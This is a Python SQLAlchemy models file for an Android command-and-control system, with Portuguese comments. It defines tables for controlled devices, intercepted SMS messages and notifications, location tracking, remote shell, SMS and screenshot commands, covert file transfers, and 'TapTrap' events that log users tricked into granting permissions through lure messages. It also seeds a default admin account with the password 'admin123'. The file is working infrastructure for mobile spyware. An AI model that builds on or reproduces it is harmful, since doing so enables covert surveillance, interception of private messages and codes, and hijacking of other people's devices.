"""
Modelos de banco de dados SQLAlchemy para o sistema de controle remoto Android
"""

from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean, Float, JSON, ForeignKey
from sqlalchemy.orm import relationship
from werkzeug.security import generate_password_hash, check_password_hash
import uuid

db = SQLAlchemy()

class User(db.Model):
    """Modelo para usuários do sistema C2"""
    __tablename__ = 'users'
    
    id = Column(Integer, primary_key=True)
    username = Column(String(80), unique=True, nullable=False)
    email = Column(String(120), unique=True, nullable=True)
    password_hash = Column(String(200), nullable=False)
    role = Column(String(20), default='operator')  # admin, operator, viewer
    active = Column(Boolean, default=True)
    last_login = Column(DateTime, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relacionamentos
    sessions = relationship('UserSession', backref='user', lazy=True, cascade='all, delete-orphan')
    
    def set_password(self, password):
        """Define hash da senha"""
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        """Verifica senha"""
        return check_password_hash(self.password_hash, password)
    
    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'role': self.role,
            'active': self.active,
            'last_login': self.last_login.isoformat() if self.last_login else None,
            'created_at': self.created_at.isoformat()
        }

class UserSession(db.Model):
    """Modelo para sessões de usuário"""
    __tablename__ = 'user_sessions'
    
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)
    session_token = Column(String(255), unique=True, nullable=False)
    ip_address = Column(String(45), nullable=True)
    user_agent = Column(Text, nullable=True)
    active = Column(Boolean, default=True)
    expires_at = Column(DateTime, nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow)

class Device(db.Model):
    """Modelo para dispositivos Android controlados"""
    __tablename__ = 'devices'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(String(64), unique=True, nullable=False)  # Android ID
    device_name = Column(String(100), nullable=True)
    model = Column(String(100), nullable=True)
    manufacturer = Column(String(50), nullable=True)
    android_version = Column(String(20), nullable=True)
    api_level = Column(Integer, nullable=True)
    app_version = Column(String(20), nullable=True)
    
    # Multi-tenant support
    operator_id = Column(Integer, ForeignKey('operators.id'), nullable=True)
    
    # Status e conectividade
    status = Column(String(20), default='offline')  # online, offline, inactive
    ip_address = Column(String(45), nullable=True)
    last_seen = Column(DateTime, default=datetime.utcnow)
    first_seen = Column(DateTime, default=datetime.utcnow)
    
    # Informações do sistema
    battery_level = Column(Float, nullable=True)
    is_charging = Column(Boolean, default=False)
    storage_used = Column(Float, nullable=True)  # GB
    storage_total = Column(Float, nullable=True)  # GB
    memory_used = Column(Float, nullable=True)  # GB
    memory_total = Column(Float, nullable=True)  # GB
    
    # Localização
    latitude = Column(Float, nullable=True)
    longitude = Column(Float, nullable=True)
    location_accuracy = Column(Float, nullable=True)
    location_timestamp = Column(DateTime, nullable=True)
    
    # Configurações
    permissions_granted = Column(JSON, nullable=True)  # Lista de permissões
    taptrap_completed = Column(Boolean, default=False)
    payload_version = Column(String(20), nullable=True)
    
    # Metadados
    notes = Column(Text, nullable=True)
    tags = Column(JSON, nullable=True)  # Lista de tags
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relacionamentos
    commands = relationship('Command', backref='device', lazy=True, cascade='all, delete-orphan')
    logs = relationship('DeviceLog', backref='device', lazy=True, cascade='all, delete-orphan')
    sms_messages = relationship('SmsMessage', backref='device', lazy=True, cascade='all, delete-orphan')
    notifications = relationship('NotificationData', backref='device', lazy=True, cascade='all, delete-orphan')
    locations = relationship('LocationData', backref='device', lazy=True, cascade='all, delete-orphan')
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'device_name': self.device_name,
            'model': self.model,
            'manufacturer': self.manufacturer,
            'android_version': self.android_version,
            'api_level': self.api_level,
            'status': self.status,
            'ip_address': self.ip_address,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
            'battery_level': self.battery_level,
            'is_charging': self.is_charging,
            'taptrap_completed': self.taptrap_completed,
            'permissions_granted': self.permissions_granted,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'created_at': self.created_at.isoformat()
        }

class Command(db.Model):
    """Modelo para comandos enviados aos dispositivos"""
    __tablename__ = 'commands'
    
    id = Column(Integer, primary_key=True)
    command_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Comando
    command_type = Column(String(50), nullable=False)  # sms, location, screenshot, shell, etc.
    command_data = Column(JSON, nullable=True)  # Parâmetros do comando
    priority = Column(String(20), default='normal')  # low, normal, high, urgent
    
    # Status
    status = Column(String(20), default='pending')  # pending, sent, executed, failed, timeout
    result = Column(JSON, nullable=True)  # Resultado da execução
    error_message = Column(Text, nullable=True)
    
    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    sent_at = Column(DateTime, nullable=True)
    executed_at = Column(DateTime, nullable=True)
    timeout_at = Column(DateTime, nullable=True)
    
    # Metadados
    created_by = Column(String(80), nullable=True)  # Username que criou
    retries = Column(Integer, default=0)
    max_retries = Column(Integer, default=3)
    
    def to_dict(self):
        return {
            'id': self.id,
            'command_id': self.command_id,
            'device_id': self.device_id,
            'command_type': self.command_type,
            'command_data': self.command_data,
            'priority': self.priority,
            'status': self.status,
            'result': self.result,
            'error_message': self.error_message,
            'created_at': self.created_at.isoformat(),
            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
            'executed_at': self.executed_at.isoformat() if self.executed_at else None,
            'created_by': self.created_by,
            'retries': self.retries
        }

# ==================== REMOVIDO NA v.2.0 ====================
# Classes Payload e PayloadDeployment foram removidas pois
# não usamos mais payloads dinâmicos .dex na versão simplificada
# ============================================================

class DeviceLog(db.Model):
    """Modelo para logs de dispositivos"""
    __tablename__ = 'device_logs'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Log info
    log_type = Column(String(50), nullable=False)  # system, error, warning, info, debug
    category = Column(String(50), nullable=True)  # sms, location, taptrap, payload, etc.
    message = Column(Text, nullable=False)
    details = Column(JSON, nullable=True)
    
    # Severidade
    severity = Column(String(20), default='info')  # critical, high, medium, low, info
    
    # Timing
    timestamp = Column(DateTime, default=datetime.utcnow)
    log_timestamp = Column(DateTime, nullable=True)  # Timestamp do próprio log
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'log_type': self.log_type,
            'category': self.category,
            'message': self.message,
            'details': self.details,
            'severity': self.severity,
            'timestamp': self.timestamp.isoformat(),
            'log_timestamp': self.log_timestamp.isoformat() if self.log_timestamp else None
        }

class SmsMessage(db.Model):
    """Modelo para mensagens SMS interceptadas"""
    __tablename__ = 'sms_messages'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # SMS info
    message_type = Column(String(20), nullable=False)  # received, sent
    phone_number = Column(String(20), nullable=False)
    message_body = Column(Text, nullable=False)
    
    # Metadata
    is_read = Column(Boolean, default=False)
    is_processed = Column(Boolean, default=False)
    message_id = Column(String(50), nullable=True)  # ID do sistema Android
    
    # Timing
    sms_timestamp = Column(DateTime, nullable=False)
    intercepted_at = Column(DateTime, default=datetime.utcnow)
    
    # Análise
    contains_keywords = Column(JSON, nullable=True)  # Palavras-chave encontradas
    is_command = Column(Boolean, default=False)  # Se é comando (#exec, etc.)
    command_type = Column(String(50), nullable=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'message_type': self.message_type,
            'phone_number': self.phone_number,
            'message_body': self.message_body,
            'is_read': self.is_read,
            'sms_timestamp': self.sms_timestamp.isoformat(),
            'intercepted_at': self.intercepted_at.isoformat(),
            'is_command': self.is_command,
            'command_type': self.command_type
        }

class NotificationData(db.Model):
    """Modelo para notificações interceptadas"""
    __tablename__ = 'notifications'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Notification info
    package_name = Column(String(200), nullable=False)
    app_name = Column(String(200), nullable=True)
    title = Column(String(500), nullable=True)
    text = Column(Text, nullable=True)
    
    # Metadata
    notification_id = Column(String(50), nullable=True)
    channel_id = Column(String(100), nullable=True)
    is_ongoing = Column(Boolean, default=False)
    is_clearable = Column(Boolean, default=True)
    
    # Classificação
    is_important = Column(Boolean, default=False)
    contains_sensitive = Column(Boolean, default=False)
    keywords_found = Column(JSON, nullable=True)
    
    # Timing
    posted_timestamp = Column(DateTime, nullable=False)
    intercepted_at = Column(DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'package_name': self.package_name,
            'app_name': self.app_name,
            'title': self.title,
            'text': self.text,
            'is_important': self.is_important,
            'contains_sensitive': self.contains_sensitive,
            'posted_timestamp': self.posted_timestamp.isoformat(),
            'intercepted_at': self.intercepted_at.isoformat()
        }

class LocationData(db.Model):
    """Modelo para dados de localização"""
    __tablename__ = 'locations'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Coordenadas
    latitude = Column(Float, nullable=False)
    longitude = Column(Float, nullable=False)
    altitude = Column(Float, nullable=True)
    accuracy = Column(Float, nullable=True)
    speed = Column(Float, nullable=True)
    bearing = Column(Float, nullable=True)
    
    # Provider info
    provider = Column(String(20), nullable=True)  # gps, network, passive
    
    # Endereço (geocoding reverso)
    address = Column(String(500), nullable=True)
    city = Column(String(100), nullable=True)
    country = Column(String(100), nullable=True)
    postal_code = Column(String(20), nullable=True)
    
    # Timing
    location_timestamp = Column(DateTime, nullable=False)
    received_at = Column(DateTime, default=datetime.utcnow)
    
    # Análise
    is_significant_move = Column(Boolean, default=False)  # Movimento significativo
    distance_from_last = Column(Float, nullable=True)  # Distância em metros
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'altitude': self.altitude,
            'accuracy': self.accuracy,
            'speed': self.speed,
            'provider': self.provider,
            'address': self.address,
            'city': self.city,
            'country': self.country,
            'location_timestamp': self.location_timestamp.isoformat(),
            'received_at': self.received_at.isoformat()
        }

class TapTrapEvent(db.Model):
    """Modelo para eventos TapTrap"""
    __tablename__ = 'taptrap_events'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # TapTrap info
    permission_type = Column(String(50), nullable=False)  # camera, location, sms, etc.
    permission_name = Column(String(100), nullable=False)
    animation_used = Column(String(100), nullable=True)
    
    # Resultado
    status = Column(String(20), nullable=False)  # granted, denied, timeout, error
    attempt_number = Column(Integer, default=1)
    response_time = Column(Float, nullable=True)  # Tempo de resposta em segundos
    
    # Context
    user_action = Column(String(100), nullable=True)  # O que o usuário achou que estava fazendo
    lure_message = Column(String(200), nullable=True)  # Mensagem de isca usada
    
    # Timing
    started_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime, nullable=True)
    
    # Dados técnicos
    device_model = Column(String(100), nullable=True)
    android_version = Column(String(20), nullable=True)
    animation_duration = Column(Integer, nullable=True)  # milissegundos
    
    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'permission_type': self.permission_type,
            'permission_name': self.permission_name,
            'status': self.status,
            'attempt_number': self.attempt_number,
            'response_time': self.response_time,
            'user_action': self.user_action,
            'lure_message': self.lure_message,
            'started_at': self.started_at.isoformat(),
            'completed_at': self.completed_at.isoformat() if self.completed_at else None
        }

class FileTransfer(db.Model):
    """Modelo para transferências de arquivos"""
    __tablename__ = 'file_transfers'
    
    id = Column(Integer, primary_key=True)
    transfer_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    # payload_id = Column(Integer, ForeignKey('payloads.id'), nullable=True) # Removed in v2.0
    
    # Transfer info
    transfer_type = Column(String(50), nullable=False)  # upload, download, steganography
    filename = Column(String(255), nullable=False)
    file_path = Column(String(500), nullable=False)
    file_size = Column(Integer, nullable=False)
    
    # Progress
    status = Column(String(20), default='pending')  # pending, transferring, completed, failed
    bytes_transferred = Column(Integer, default=0)
    progress_percentage = Column(Float, default=0.0)
    
    # Speed e timing
    transfer_speed = Column(Float, nullable=True)  # bytes/sec
    started_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime, nullable=True)
    
    # Error handling
    error_message = Column(Text, nullable=True)
    retry_count = Column(Integer, default=0)

class SystemStats(db.Model):
    """Modelo para estatísticas do sistema"""
    __tablename__ = 'system_stats'
    
    id = Column(Integer, primary_key=True)
    
    # Contadores globais
    total_devices = Column(Integer, default=0)
    active_devices = Column(Integer, default=0)
    total_commands = Column(Integer, default=0)
    successful_commands = Column(Integer, default=0)
    # total_payloads = Column(Integer, default=0) # Removed in v2.0
    
    # TapTrap stats
    taptrap_attempts = Column(Integer, default=0)
    taptrap_successes = Column(Integer, default=0)
    taptrap_success_rate = Column(Float, default=0.0)
    
    # Performance
    avg_response_time = Column(Float, default=0.0)
    uptime_percentage = Column(Float, default=0.0)
    
    # Timing
    stats_date = Column(DateTime, default=datetime.utcnow)
    created_at = Column(DateTime, default=datetime.utcnow)

class SystemEvent(db.Model):
    """Modelo para eventos do sistema C2"""
    __tablename__ = 'system_events'
    
    id = Column(Integer, primary_key=True)
    
    # Event info
    event_type = Column(String(50), nullable=False)  # startup, shutdown, error, warning
    event_category = Column(String(50), nullable=True)  # auth, device, payload, taptrap
    message = Column(Text, nullable=False)
    details = Column(JSON, nullable=True)
    
    # Context
    user_id = Column(Integer, ForeignKey('users.id'), nullable=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=True)
    ip_address = Column(String(45), nullable=True)
    
    # Severity
    severity = Column(String(20), default='info')  # critical, high, medium, low, info
    
    # Timing
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'event_type': self.event_type,
            'event_category': self.event_category,
            'message': self.message,
            'details': self.details,
            'severity': self.severity,
            'timestamp': self.timestamp.isoformat()
        }

# Função para inicializar banco de dados
def init_database(app):
    """Inicializa banco de dados com configurações da aplicação"""
    db.init_app(app)
    
    with app.app_context():
        # Criar todas as tabelas
        db.create_all()
        
        # Criar usuário admin padrão se não existir
        admin_user = User.query.filter_by(username='admin').first()
        if not admin_user:
            admin_user = User(
                username='admin',
                email='admin@system.local',
                role='admin'
            )
            admin_user.set_password('admin123')
            db.session.add(admin_user)
            db.session.commit()
            print("Usuário admin criado com sucesso")
        
        print("Banco de dados inicializado com sucesso")

# Função para criar dados de exemplo
def create_sample_data():
    """Cria dados de exemplo para desenvolvimento"""
    
    # Device de exemplo
    sample_device = Device(
        device_id='sample_device_001',
        device_name='Samsung Galaxy S21',
        model='SM-G991B',
        manufacturer='Samsung',
        android_version='13',
        api_level=33,
        status='online',
        battery_level=85.5,
        is_charging=False,
        taptrap_completed=True,
        permissions_granted=['camera', 'location', 'sms'],
        latitude=-23.550520,
        longitude=-46.633308
    )
    
    db.session.add(sample_device)
    db.session.commit()
    
    # Comandos de exemplo
    sample_commands = [
        Command(
            device_id=sample_device.id,
            command_type='location',
            command_data={'accuracy': 'high'},
            status='executed',
            created_by='admin'
        ),
        Command(
            device_id=sample_device.id,
            command_type='sms',
            command_data={'number': '+5511999999999', 'message': 'Test'},
            status='pending',
            created_by='admin'
        )
    ]
    
    for cmd in sample_commands:
        db.session.add(cmd)
    
    db.session.commit()
    print("Dados de exemplo criados")